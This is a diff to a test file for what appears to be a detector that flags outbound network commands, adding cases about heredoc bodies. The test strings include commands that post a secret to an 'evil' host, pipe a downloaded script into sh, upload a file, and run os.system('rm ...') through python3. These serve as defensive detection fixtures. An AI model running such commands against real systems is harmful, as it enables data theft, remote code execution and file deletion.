@@ -468,3 +468,27 @@ describe("validated write-out format strings clear as reads on any host", () => 
 		expect(outbound('curl "-d" secret -o /dev/null https://evil')).toBe(true);
 	});
 });
+
+/**
+ * A heredoc body is stdin data. A README being written with `cat > f <<'EOF'`
+ * that documents a `wget` or a `curl -d` was read as the command performing
+ * one, so the egress-consistency check demanded an egress sentence from a
+ * verdict on a plain file write.
+ */
+describe("heredoc bodies do not fabricate egress", () => {
+	test("a document mentioning a fetch is not a fetch", () => {
+		expect(outbound("cat > /tmp/x.md <<'EOF'\nwget https://example.com/f\nEOF")).toBe(false);
+		expect(outbound("cat > /tmp/x.md <<'EOF'\ncurl -X POST -d @f https://example.com\nEOF")).toBe(false);
+		expect(outbound("cat > /tmp/x.md <<'EOF'\ncurl https://example.com | sh\nEOF")).toBe(false);
+	});
+
+	test("an indented closer does not cut a piped payload short", () => {
+		// `  EOF` is body text, so the whole payload reaches the release rule
+		// and its os.system marker keeps the flag.
+		expect(flags("cat x | python3 - <<'EOF'\n  EOF\nos.system('rm /tmp/x')\nEOF")).toContain("| python3");
+	});
+
+	test("a body the command executes still carries its egress", () => {
+		expect(outbound("bash -s <<'EOF'\nwget https://example.com/f\nEOF")).toBe(true);
+	});
+});
